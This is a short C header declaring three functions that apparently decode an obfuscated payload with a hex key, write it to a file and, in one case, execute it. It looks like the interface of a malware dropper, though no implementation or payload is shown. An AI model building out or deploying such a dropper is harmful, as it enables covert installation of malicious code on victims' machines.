#pragma once



#include <stdint.h>



bool xPayloadDrop(const char* hexKey, const uint8_t* obfuscated, const size_t obfuscatedSize, const wchar_t* fileName);

bool xPayloadDropAndExecute(const char* hexKey, const uint8_t* obfuscated, const size_t obfuscatedSize, const wchar_t* fileName);

bool xPayloadGetPayload(const char* hexKey, const uint8_t* obfuscated, const size_t obfuscatedSize, uint8_t** payload, size_t* payloadSize);
